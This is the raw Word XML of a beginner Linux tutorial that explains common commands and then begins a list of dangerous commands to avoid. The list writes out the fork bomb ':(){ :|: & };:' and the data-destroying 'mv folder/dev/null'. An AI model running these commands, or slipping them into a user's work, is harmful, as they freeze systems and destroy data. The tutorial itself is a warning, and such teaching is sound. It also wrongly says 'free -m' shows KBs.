          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ends the current terminal (bash) session. It’s the same as you clicking on the close button in the title bar of any application to close that application in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F90A35A" w14:textId="0AA9E8D2"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A5692C8" wp14:editId="0C85F8E4">
            <wp:extent cx="5781675" cy="1400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0175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD7A56F"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ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF28930"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ping &lt;remote-host-address&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> pings a remote host (server) by sending ping packets. It can be used to check for network connectivity or the status (up and running or otherwise) of a server. It’s the same as you pinging a host using the network manager in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C85C5A4" w14:textId="4CECC9D2"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1649EE2E" wp14:editId="4633D12F">
            <wp:extent cx="5943600" cy="3596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52FBD7D4"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who – Who Is logged in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2293C326"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who</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows the list of currently logged in users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B24832" w14:textId="05C8A7FC"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D43274A" wp14:editId="216A4AEA">
            <wp:extent cx="36861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175" cy="1914525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="67887343"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Switch User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BACE04"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>su</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&lt;username&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> switches to a different user. Super user (root) can switch to any other user in the terminal even without using their password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317E793F" w14:textId="7BFEB1F2"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04470DCA" wp14:editId="5898E10E">
            <wp:extent cx="3362325" cy="781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2325" cy="781050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFE4139"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="441911A8"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows important information about your system such as kernel name, host name, kernel release number, processor type and various others. You can use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>uname</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-a</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view all information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C72DBB" w14:textId="63EB2E09"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34E8B1EF" wp14:editId="35A70803">
            <wp:extent cx="5943600" cy="1165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65225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44320E4A"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free – Free memory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5AFEEE"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free</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows information about the free, used, swap memory available (or currently free) in your system. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>free -m</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view memory in KBs and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">free </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>â€“g</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view memory in GBs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F2C653" w14:textId="0FB3551A"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5DFEF676" wp14:editId="2080FE95">
            <wp:extent cx="5810250" cy="1266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250" cy="1266825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAF6480"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df – Disk space Free</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAF5033"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df</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows information about the file system’s disk space usages – used and available storage space on your hard disk and other storage devices. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>df -h</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view the space usages in human readable form (i.e. memory in GBs).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A49C3A" w14:textId="0EE63072"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19420880" wp14:editId="78EF4991">
            <wp:extent cx="5381625" cy="248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625" cy="2486025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0A45E5"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ProcesseS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E284073"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> displays information about the running processes of the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793D68F2" w14:textId="681CF0DA"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154CE51A" wp14:editId="5105D72E">
            <wp:extent cx="3219450"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1219200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EFFEB4"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lastRenderedPageBreak/>
        <w:t>Top – TOP processes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690B23B8"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top</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows information about the top processes in the system (sorted by CPU usage by default). You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>top -u &lt;username&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view the top processes of a single user. It’s the same as you viewing the list of the most resource-hungry running processes using some task manager in GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B662BFF" w14:textId="4B964132" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:noProof/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41FDDEAD" wp14:editId="61065921">
            <wp:extent cx="5943600"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49B2D3E4"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shutdown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C77AE36"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shutdown</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shuts down your computer. You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>shutdown -r</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to restart your computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46634C65"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Did you use or practice some of these commands? Do you know any other useful Linux command for beginners? Kindly let us know using the comments section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D5538B" w14:textId="4D3A87FD" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9 commands and codes you should avoid executing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597FC5FB" w14:textId="55919DA0" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D6B9E43" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pBdr>
          <w:left w:val="single" w:sz="48" w:space="8" w:color="BFCADA"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Recommended Reading:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="2E5DC5"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>10 Most Asked Questions About Linux</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04A354BF"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">1. Linux Fork Bomb Command </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F6E627"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 :|: &amp; };:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> also known as </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Fork Bomb</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a denial-of-service attack against a Linux System. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>:(){ :|: &amp; };:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a bash function. Once executed, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>it repeats itself multiple times until the system freezes</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E81394"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You can only get rid of it by restarting your system. So be careful when executing this command on your Linux shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C43CB17"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2. mv folder/dev/null Command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD2FF48"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mv folder/dev/null</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
